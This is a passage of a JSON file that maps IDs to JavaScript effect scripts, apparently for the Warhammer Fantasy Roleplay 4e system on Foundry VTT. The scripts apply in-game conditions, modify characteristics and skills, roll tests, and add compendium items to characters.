{fromEffect: this.effect.id})","aeBetniKqq5SD9Ou":"let characteristics = {\n    \"ws\" : 30,\n    \"bs\" : 20,\n    \"s\" : 20,\n    \"t\" : 25,\n    \"i\" : 20,\n    \"ag\" : 0,\n    \"dex\" : 0,\n    \"int\" : 30,\n    \"wp\" : 40,\n    \"fel\" : 30\n}\nlet skills = [\"Intimidate\", \"Language (Classical)\", \"Leadership\", \"Lore (Warfare)\", \"Lore (History)\", \"Perception\"]\nlet skillAdvancements = [20, 30, 20, 30, 20, 20]\nlet talents = [\"Combat Aware\", \"Combat Reflexes\", \"Drilled\", \"Menacing\", \"Robust\", \"Strike Mighty Blow\", \"Strike Mighty Blow\", \"War Leader\"]\nlet trappings = [\"Hand Weapon\", \"Plate Breastplate\", \"Plate Helm\", \"Plate Leggings\"]\nlet specialItems = [ \n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nconsole.log(\">>>>>>><\", items)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","afdmOvPGMpEdZvCb":"return (args.skill?.name == game.i18n.localize(\"NAME.Perception\") || args.characteristic == \"fel\")","agsm3NI1NDtHRG4y":"this.actor.getActiveTokens().forEach(t => t.document.update({texture : this.actor.prototypeToken.texture}, {animate : false}));","ahbA7o5G9dzMFl76":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.SfUUdOGjdYpr3KSR\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","alJgj25l3239h2SW":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.hTgrGkWnmIR4xhVe\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","araS9qYWOAVrV8F7":"args.actor.system.details.man -= 3;\nargs.actor.system.details.move.value -= 2;","ayIbw2Vw2t9xg33P":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.EaqlLRQigwnsEAXX\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","b1zMefdoZYtzCm7i":"return [\"roll\", \"none\"].includes(args.fields.hitLocation) || args.item?.attackType != \"ranged\"","b2Kb4IuD22RhKhR0":"let actor = Array.from(game.user.targets)[0]?.actor;\n\nif (actor)\n{\n    actor.applyEffect({effectUuids : this.effect.sourceItem.effects.contents[0].uuid})\n}\nelse\n{\n    this.script.scriptNotification(\"No target!\", \"error\")\n}","b2WaqRna5CFXmbDG":"args.options.stag = true;","b5DfAWtpV1x2R8If":"this.script.scriptMessage(await this.actor.applyBasicDamage(this.effect.sourceTest.result.damage, {suppressMsg: true}))","b5prg1FLjCAvBjLy":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.zyocWSzEZEC826NS\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data])\n\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty: \"hard\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    await this.actor.addCondition(\"prone\")\n    await this.actor.addCondition(\"stunned\")\n}","b8G4cjfn3RG2tEYX":"this.actor.addCondition(\"ablaze\", 3);","bBdXzBmxgFFBwMMS":"if(args.opposedTest.attackerTest.item?.isRanged && args.applyAP && !args.sureShot)\n{\n   if (args.modifiers.ap.value)\n   {\n    args.sureShot = true;\n    args.modifiers.ap.details.push(`${this.effect.name} (Ignore ${this.item.Advances})`)\n    args.modifiers.ap.ignored += this.item.Advances;\n   }\n}","bEVlJOOA1kLlzpWx":"let characteristics = {\n    \"ws\" : 10,\n    \"bs\" : 0,\n    \"s\" : 5,\n    \"t\" : 15,\n    \"i\" : 20,\n    \"ag\" : 15,\n    \"dex\" : 20,\n    \"int\" : 35,\n    \"wp\" : 30,\n    \"fel\" : 10\n}\nlet skills = [\"Channelling\", \"Cool\", \"Dodge\", \"Entertain (Storytelling)\", \"Intuition\", \"Language (Magick)\", \"Leadership\", \"Lore (Magic)\", \"Lore (Theology)\", \"Perception\"]\nlet skillAdvancements = [20, 25, 20, 25, 30, 25, 15, 20, 10, 30]\nlet talents = [\"Aethyric Attunement\", \"Arcane Magic\", \"Instinctive Diction\", \"Instinctive Diction\", \"Luck\", \"Magical Sense\", \"Menacing\", \"Petty Magic\", \"Second Sight\", \"Sixth Sense\"]\nlet trappings = [\"Hand Weapon\", \"Quarterstaff\", \"Ritual Dress incorporating many ingredients and fetishes\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        items.push({name : trapping, type : \"trapping\", \"system.trappingType.value\" : \"clothingAccessories\"})\n        //ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","bL98Sr1TRLMPEdlk":"if (args.test.failed)\n{\n\tthis.actor.addCondition(\"fatigued\");\n}","bLkt8VpTTPoTxW0W":"if (args.opposedTest.result.hitloc.value == \"body\" && args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"bleeding\", 1);\n    this.script.scriptNotification(\"Added Bleeding\")\n}\n","bMEFHPCei2evnZZw":"// Victims that take at least 1 Wound from a Fell Dagger\n// immediately take a Poisoned Condition \n// resisted with a Difficult (-10) Endurance Test. \n\n// TODO: Add Venom strength to message\n\nif (args.totalWoundLoss > 0) \n{\n  args.actor.addCondition(\"poisoned\")\n  this.script.scriptMessage(`\n      <strong>${this.effect.name}</strong>:<br>\n      <strong>${args.actor.name}</strong> has been given a @Condition[Poisoned] Condition, which can be resisted with a <strong>Difficult (-10) Endurance</strong> Test.`, \n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")})\n}\n","bQyVajMN1ETwlzvM":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.aE3pyW20Orvdjzj0\")\nlet data = item.toObject();\nlet target = await game.wfrp4e.tables.rollTable(\"fixations\")\nif (target)\n{\n    data.system.specification.value = target.result\n    this.script.scriptNotification(target.result);\n}\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","bRiFHPC1StKxqNIC":"if (isNaN(parseInt(this.item.system.specification.value))) {\n  let value = await ValueDialog.create(\"Sturdy Value\", \"Enter the Sturdy value\");\n  if (value) {\n    this.item.updateSource({\"system.specification.value\" : value});\n  }\n}","bRtZH0xRh8dgqMeW":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.BqPZn6q3VHn9HUrW\")\nlet data = item.toObject();\ndata.system.specification.value = 7 - this.actor.characteristics.s.bonus\ndata.name = item.name.replace(\"(Feature)\", \"\");\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","bWr8leucbWslBCYG":"return args.characteristic != \"s\"","bhXUW7IJtEaUGAoV":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();  \nif (test.failed)\n{\n    this.actor.addCondition(\"prone\");\n}\n  ","brNRqfpPqD2Ki0cM":"args.prefillModifiers.modifier -= 10","btPrQkGRKUkhNe3N":"return args.skill?.name == \"Trade (Apothecary)\"","bwtQOSWn120NICkf":"let test = await this.actor.setupCharacteristic(\"ag\", {fields : {difficulty : \"hard\"}});\nawait test.roll();\n\nif (test.failed)\n{\n   await this.actor.addCondition(\"bleeding\")\n   await this.actor.addCondition(\"entangled\")\n}","bwx9wuEOJPF7btD1":"return args.skill?.name != game.i18n.localize(\"NAME.Navigation\");","bzaoWcieMFaU5B5l":"return !this.actor.flags.useless[this.item.system.location.key] || [\"fel\", \"wp\", \"int\", \"t\"].includes(args.characteristic)","c31hjp7k0hlpdGBC":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.yRhhOlt18COq4e1q\");\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","c3KA1knL2NYNUEww":"return args.skill?.name != game.i18n.localize(\"NAME.Evaluate\");","cAioHYtlxuOCwRLh":"let ablaze = Number(args.opposedTest.attackerTest.result.SL) + 1\nargs.actor.addCondition(\"ablaze\", ablaze)","cApfxL7Ic0NKdoSr":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.rOV2s6PQBBrhpMOv\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","cBSy9CR5NZvcLRg8":"\n        args.prefillModifiers.modifier += 0;\n        args.prefillModifiers.slBonus += 0;\n        args.prefillModifiers.successBonus += 0;\n        ","cDBhmHn5kjgWBAlT":"let num = (this.effect.sourceTest.result.overcast.usage.other.current || 1)\n\nthis.actor.addCondition(\"entangled\", num)","cEg09bnvZD6Ysnpc":"let item = await fromUuid(\"Compendium.wfrp4e-archives2.items.anIlqJXFOIEzIOo1\")\nlet data = item.toObject();\ndata.name = this.item.name;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","cJFDnq1HI4gXWcJo":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Ward value\", this.effect.name);\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","cK1Jysfu5IMUUH0C":"if (!args.ward)\n{\n\targs.ward = (this.effect.getFlag(\"wfrp4e\", \"ward\") || 0);\n\tif (args.wardRoll >= args.ward && args.ward > 3)\n    {\n        let newWard = Math.max(3, args.ward - 1)\n        this.script.scriptMessage(\"<strong>Ward</strong> improved to \" + newWard)\n        this.effect.setFlag(\"wfrp4e\", \"ward\", newWard)\n    }\n\n}","cOuukVo8WakDZIUj":"args.prefillModifiers.slBonus += 1","cTYNaKbepMwqYsZ8":"\n                            let difficulty = \"\"\n                            if (this.effect.name.includes(\"Moderate\"))\n                                difficulty = \"easy\"\n                            else if (this.effect.name.includes(\"Severe\"))\n                                difficulty = \"average\"\n                            else\n                                difficulty = \"veasy\"\n        \n                            let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {context : {failure : this.actor.name + \" dies from Blight\"}, fields: {difficulty}, appendTitle : \" - Blight\"})\n                            await test.roll();\n                            if (test.failed)\n                            {\n                                this.actor.addCondition(\"dead\");\n                            }\n                            ","cUFCL02JoaZObRcX":"let sl = this.effect.sourceTest.result.slOver;\n\nthis.actor.system.characteristics.s.modifier += sl * 10;\nthis.actor.system.characteristics.s.calculationBonusModifier -= sl;","cUnbADgOQ4fMKgrH":"let group\nlet item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.5hH73j2NgPdsLCZN\");\nlet data = item.toObject();\n\nif (this.item.name.includes(\"(\"))\n{\n\tgroup = this.item.parenthesesText\n}\n\nelse \n{\n\tgroup = await ValueDialog.create(\"Enter Hatred Group\", \"Hatred Group\")\n\n\tthis.item.updateSource({name : this.item.name + ` (${group})`, \"system.tests.value\" : this.item.system.tests.value.replace(\"Group\", group)})\n\tthis.effect.updateSource({name : this.effect.name + ` (${group})`})\n}\n\n\ndata.name = data.name.replace(\"Target\", group);\nawait this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id});","cV9JiAgUPOeUHKnS":"args.fields.successBonus++;\nif (args.skill?.name != game.i18n.localize(\"NAME.SleightOfHand\"))\n{\n    args.fields.modifier += 10;\n}","cYPIXzl86a3LFsTE":"if (args.item.type == \"spell\")\n{\n   args.item.cn.value -=2\n   if (args.item.cn.value < 0)\n      args.item.cn.value = 0\n}","cgmA2N0MkjA7qIZy":"return args.type != \"cast\" || args.item?.system.lore?.value != \"shadow\"","ch5SD2XOQfcYo0X5":"if (args.sizeDiff <= -2 && args.opposedTest.attackerTest.result.critical)\n        args.damageMultiplier = Math.abs(args.sizeDiff)\n\n      let sBonusDiff = args.opposedTest.defenderTest.actor.characteristics.t.bonus - args.opposedTest.attackerTest.actor.characteristics.s.bonus\n     let weapon = args.opposedTest.attackerTest.item\n      if (sBonusDiff > 0 && weapon && weapon.damage.value.includes(\"SB\"))\n      {\n        args.damage += sBonusDiff\n        args.breakdown.other.push({label : this.effect.name, value : sBonusDiff});\n      }","chUpiI3el8IO8MSs":"if (args.opposedTest.attackerTest.item?.name.includes(\"Bite\"))\n{\n    let woundsGained = args.totalWoundLoss;\n    this.script.scriptMessage(`Gains ${woundsGained} Wounds`, { whisper: ChatMessage.getWhisperRecipients(\"GM\") })\n    this.actor.modifyWounds(woundsGained)\n}","ckKbPfaTiQ2qBZdR":"console.log(\"DAMAGE\", this)","csLKDJKZaUK9vwLT":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.7rBhIRo96Mydo0Cv\")\nlet data = item.toObject();\ndata.system.location.value = \"Back\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n","ct6WGaRMfrcnHhyv":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\")\nlet data = item.toObject();\ndata.system.specification.value = 2;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","cuqCtQsfLBBAGjnu":"args.fields.slBonus -= (Number(this.item.specification.value) || 0)","cysQDjlDzT8HdNeo":" args.prefillModifiers.slBonus += 1","d29mu8vRt9AQUm0L":"this.actor.characteristics.i.value = Math.min(this.actor.characteristics.i.value, 10);\nthis.actor.characteristics.i.bonus = 1;\n\nfor(let skill of this.actor.itemTypes.skill.filter(i => i.system.characteristic.value == \"i\"))\n{\n    skill.system.total.value= Math.min(skill.system.total.value, 10)\n}","d6mVm08o8SeklAcW":"this.actor.system.status.ward.value = 9;","d9iU08yvqcffF026":"return args.weapon.system.usesHands.includes(this.effect.getFlag(\"wfrp4e\", \"location\"))","dAMtbn3uQwF8KpKU":"return args.skill?.name != game.i18n.localize(\"NAME.Charm\") && args.skill?.name != game.i18n.localize(\"NAME.Gossip\");","dIxYt421K010eogY":"\n                            let modifier = 0\n                            if (this.effect.name.includes(\"Moderate\"))\n                                modifier = -20\n                            else\n                                modifier = -10\n                            args.fields.modifier += modifier\n                            ","dM449AU0FQRnOc3l":"if (args.opposedTest.result.hitloc.value == \"head\")\n{\n  args.abort = \"Missed - Headless\"\n}","dM8FbRH2V8CpOkXw":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.QluSTTTq3viHJJUh\")\nlet data = item.toObject();\ndata.system.location.value = \"Ribs\";\nawait this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","dSmRhZ6o1bUcOSF9":"return args.skill?.name != game.i18n.localize(\"NAME.Leadership\");","dULCkRxtisuzQyuK":"if (args.options.condition) \n  this.effect.delete();","dWr3tkFoIzsAgelu":"let injury = this.effect.itemTargets[0]\nif (injury && this.effect.sourceTest.result.outcome == \"success\") {\n let days = new Roll(injury.system.duration.value).evaluateSync().total\n let num = 1 + Number(this.effect.sourceTest.result.SL);\n let roll = await new Roll(num+'d10').roll()\n await roll.toMessage(this.script.getChatData())\n let newDays = Math.max(days - roll.total, 1)\n this.actor.updateEmbeddedDocuments(\"Item\", [{_id: injury.id, 'system.duration.value': newDays} ])\n let message = \"Injury reduces to \"+newDays+\" (-\" + roll.total + \") instead of \"+days\n this.script.scriptMessage(message)\n}\n","dXGosSxdoYbET2O8":"await this.actor.addCondition(\"fatigued\");\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"))\n\nawait test.roll();\n\nif (!test.succeeded)\n{\n    await this.actor.addCondition(\"fatigued\");\n    await this.actor.addCondition(\"broken\");\n}","dZ4c5pKDqQV02aIK":"if (args.effect.conditionId == \"ablaze\")\n{\n     args.data.formula += ` + parseInt(this.effect.sourceTest.result.SL)`\n}","dbHv7dAXgB2Oy1Fg":"let nbBleeding = 1 + Number(this.effect.sourceTest.result.SL);\nthis.actor.removeCondition(\"bleeding\", nbBleeding);\nconsole.log(this.actor);\n","dbOSvpgcPjsc2uvq":"let menacing = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.0hn6UaKq8CoZP2zD\")).toObject();\nlet sense = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.9h82z72XGo9tfgQS\")).toObject();\n\nsense.name += \" (Sight)\";\nsense.system.tests.value = sense.system.tests.value.replace(\"Sense\", \"Sight\")\n\nthis.actor.createEmbeddedDocuments(\"Item\", [menacing, sense], {fromEffect : this.effect.id})","dbYjr4oG67Z880To":"if (args.test.isFumble)\n{\n    args.test.result.other.push(\"@Table[warpfire-thrower-fumble]\")\n}","dcwY8dCd3PNCEzk6":"let current = this.actor.status.fate.value\n\nthis.actor.update({\"system.status.fate.value\" : current + 1})\n\nthis.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> fate points increased from ${current} to ${current + 1}`)","dfEgat3jz4EtWszH":"return args.skill?.name == \"Stealth (Urban)\"","dfnCK8jCPXNLM7Gh":"let aoeDamage = this.effect.sourceTest.result.damage - 5 // Easily handle magic missile damage by just subtracting 5 from the item's (which has +10 base)\n\nthis.script.scriptMessage(await this.actor.applyBasicDamage(aoeDamage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg : true}))\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Dodge\"), {skipTargets: true, appendTitle :  ` - Ablaze`})\n\nawait test.roll();\n\nif (!test.succeeded)\n{\n    this.actor.addCondition(\"ablaze\");\n}","dh5mAlaOOLCBC0YQ":"args.actor.system.details.length.value += args.actor.system.details.length.value * 0.1;","dk02qSJfJaIo3Geh":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.EO05HX7jql0g605A\");\nlet data = item.toObject();\ndata.system.specification.value = this.actor.characteristics.ag.value\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","dkY7WRYjFVh8GB0m":"return ['ws', 'bs', 'ag'].includes(args.characteristic)","dkiNmwFXztIVbuxg":"let currentCareer = this.actor.system.currentCareer;\n\nif (!currentCareer || currentCareer.system.talents.includes(game.i18n.localize(\"NAME.Frenzy\")))\n{\n    return\n}\n\ncurrentCareer.system.talents.push(game.i18n.localize(\"NAME.Frenzy\"));","dqvHDMlcitLx1pUx":"this.actor.system.details.move.value /= 2;","dsXGavzXLerXR8Xg":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Sail\")) && !args.skill?.name.includes(game.i18n.localize(\"NAME.Row\"))","dt85W8pzZ09w1QLi":"if (this.actor.sameSideAs(this.effect.sourceActor))\n    args.fields.slBonus += 2;\nelse\n    args.fields.slBonus -= 2;","dtFvpY96RPzNnphq":"return !(args.skill?.name.includes(\"Melee (Basic)\") || (args.type == \"weapon\" && args.item?.system.weaponGroup.value == \"basic\"))","dwSgcFxKN3S0hLJL":"return args.skill?.name != \"Melee (Brawling)\" && args.item?.weaponGroup?.value != \"brawling\"","dxxDFXNNqUsuMyUD":"args.fields.slBonus += 1","e0TuMgYuI7ZtGoQr":"args.applyAP = false;\n\nawait args.actor.addCondition(\"ablaze\", 2);\nawait args.actor.addCondition(\"prone\");","e34s1XxHckAWfwHt":"if (args.test.options.beatBlade && (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target))\n{\n   args.test.result.other.push(`<b>${this.effect.name}</b>: Opponent loses ${Number(args.test.result.SL) + 1} Advantage`)\n}","e4HotRnEiyXR0pIu":"this.actor.applyEffect({effectUuids : this.item.effects.contents[1].uuid})","e7IxnxePdXSy6L4E":"if (args.opposedTest.result.hitloc.value == \"head\")\n{\n     this.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> receives a @Table[crithead]{Critical Wound} if one was not caused already.`)\n}","eAtqyBd1HsDWuBuI":"this.actor.system.characteristics.fel.modifier -= parseInt(this.item.system.location.value) || 1","eHRv7f2BTtle6Y1K":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.sJ3yX1kvzu2hgNq5\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","eHgk3HZ6eyLFTZ9o":"return !args.item?.system.magicMissile?.value && !args.item?.system.attackType","ePPgxQOqL1Uhz2k9":"let choice1 = [\n    {\n        type : \"skill\",\n        name : \"Ranged (Bow)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 10\n                }\n            }\n        }\n    },\n    {\n        type : \"weapon\",\n        name : \"Bow\",\n    },\n    {\n        type : \"ammunition\",\n        name : \"Arrow\",\n    }\n]\nlet choice2 = [\n]\n\nlet choice = await Dialog.wait({\n        title : \"Option\",\n        content : \n        `<p>\n        Add Option?\n        </p>\n        <ol>\n        <li>Ranged (Bow) +10 and a Bow with 12 Arrows</li>\n        </ol> \n        `,\n        buttons : {\n            1 : {\n                label : \"Yes\",\n                callback : () => {\n                    return choice1\n                }\n            },\n            2 : {\n                label : \"No\",\n                callback : () => {\n                    choice2\n                }\n            }\n        }\n    })\n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(foundry.utils.mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","eWWLmA2xINR321aK":"args.item.system.qualities.value.push({name : \"magical\"})","eb69QPmNQEJXtk4l":" return args.characteristic != \"bs\"","ebDQH0MdGAG02CHl":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.SYjWiKDzMS6CtROJ\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nif (this.item.system.location.key == \"rArm\")\n{\n\tdata.system.location.value = \"Right Hand\"\n\tdata.system.location.key = \"rHand\"\n}\nelse if (this.item.system.location.key == \"lArm\")\n{\n\tdata.system.location.value = \"Left Hand\"\n\tdata.system.location.key = \"lHand\"\n}\nthis.actor.createEmbeddedDocuments(\"Item\", [data])","ed7Sud9HM3uB2j6b":"ChatMessage.create({content : \"<em>Yield or die!</em>\", speaker : ChatMessage.getSpeaker({token: this.actor.getActiveTokens()[0]?.document, actor: this.actor})}, {chatBubble : true})\nlet item = await fromUuid(\"Compendium.wfrp4e-core.items.pTorrE0l3VybAbtn\")\nlet data = item.toObject();\ndata.system.specification.value = 2;\nthis.script.scriptNotification(\"Adding \" + data.name);\nawait this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id});\ngame.wfrp4e.utility.postFear(2, this.actor.prototypeToken.name)","egDtqMxe3iekc6hv":"let trait = args.opposedTest.attackerTest.item\nlet woundLossEffect = this.item.effects.get(\"7Amhi75wLv0PvGjd\")\nif (trait && trait.name.includes(\"Bite\") && woundLossEffect)\n{\n    args.actor.applyEffect({effectUuids : woundLossEffect.uuid})\n}","eh1J3s0s4A2AxoFp":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.8pVzgPkgWpTJvfhG\");\nlet data = item.toObject();\ndata.name += \" (Enemy)\";\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","ekjJQHyMbZT2vqdc":"let uses = this.item.getFlag(\"wfrp4e\", \"uses\") || 0;\nuses++;\nthis.script.scriptNotification(`Used ${uses} times`)\nthis.item.setFlag(\"wfrp4e\", \"uses\", uses);\nif (uses >= 3)\n{\n\tthis.effect.update({\"flags.wfrp4e.applicationData.type\" : \"other\"})\n\tthis.script.scriptNotification(`Used up`);\n}\n","eqxE7nBO13yJS7hc":"let roll = (await new Roll(\"1d10\").roll())\nroll.toMessage({flavor: \"Wounds Healed\", speaker : {alias : this.actor.name}})\n\nthis.actor.modifyWounds(roll.total)\n\nthis.actor.hasCondition(\"bleeding\")?.delete();","esuLwq4g5T8k1kLT":"await args.actor.addCondition(\"ablaze\"); await args.actor.addCondition(\"prone\");","ezGqDoC9hNRBnFTB":"        let choices = await Promise.all([game.wfrp4e.utility.findItemId(\"1zaqojk0Oq1m8vYv\"), game.wfrp4e.utility.findItemId(\"zIuarD5mB0EF0ji0\")])\n        let items = await game.wfrp4e.apps.ItemDialog.create(choices, 1, \"Choose a Weapon\")\n        items = items.map(i => i.toObject())\n        \n        items.forEach(i => equip(i))\n        \n        this.actor.createEmbeddedDocuments(\"Item\", items);\n        \n        function equip(item)\n        {\n            if (item.type == \"armour\")\n                item.data.worn.value = true\n            else if (item.type == \"weapon\")\n                item.data.equipped = true\n            else if (item.type == \"trapping\" && item.data.trappingType.value == \"clothingAccessories\")\n                item.data.worn = true\n        }","f062aa2BNClx08D6":"let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if (test.failed) \n    {\n      let toughnessLost = parseInt(this.effect.sourceTest.result.SL)\n\n      let currentModifier = this.actor.characteristics.t.modifier\n\n      await this.actor.update({ \"system.characteristics.t.modifier\": currentModifier - toughnessLost })\n      this.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> lost ${toughnessLost} Toughness`)\n      if (this.actor.system.characteristics.t.value <= 0)\n      {\n          this.actor.addCondition(\"dead\");\n      }\n\n    }","f29Pv6TQtgILxt1h":"if (args.test.options.healWounds) {\n if (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target) {\n   let wounds = this.actor.characteristics.int.bonus + ~~args.test.result.SL\n   if (args.test.options.fieldDressing && args.test.result.reversed)\n      wounds = this.actor.characteristics.int.bonus + Math.min(1, Number(args.test.result.SL))\n\targs.test.result.woundsHealed = wounds\n\targs.test.result.other.push(`<b>${this.actor.name}</b> healed <b>${wounds}</b> wounds of the patient.`)\n   }\n   else if (this.actor.characteristics.int.bonus + args.test.result.SL < 0)\n      args.test.result.other.push(`The patient contracts a 